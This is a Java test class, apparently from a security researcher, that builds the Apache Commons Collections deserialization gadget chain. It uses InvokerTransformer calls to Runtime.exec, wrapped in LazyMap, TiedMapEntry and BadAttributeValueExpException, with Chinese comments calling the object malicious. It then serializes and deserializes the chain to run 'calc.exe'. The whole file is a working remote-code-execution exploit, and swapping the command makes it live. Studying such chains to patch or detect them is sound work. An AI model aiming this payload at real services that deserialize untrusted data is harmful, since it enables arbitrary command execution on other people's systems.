package effect.serialize.leak;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author liu.teng
 * @Date 2020/8/11 19:41
 * @Version 1.0
 */
public class BadExceptionTest {
    public static void main(String[] args) throws Exception {
        new BadExceptionTest().run();
    }

    public void run() throws Exception {
        deserialize(serialize(getObject()));
    }

    //在此方法中返回恶意对象
    public Object getObject() throws Exception {
        //构建恶意代码
        String command="calc.exe";
        final String[] execArgs = new String[] { command };
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs)
        };
        Transformer transformer=new ChainedTransformer(transformers);

        final Map lazyMap = LazyMap.decorate(new HashMap(), transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);

        //利用反射的方式来向对象传参
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);
        return val;
    }

    public  byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    public  Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }
}
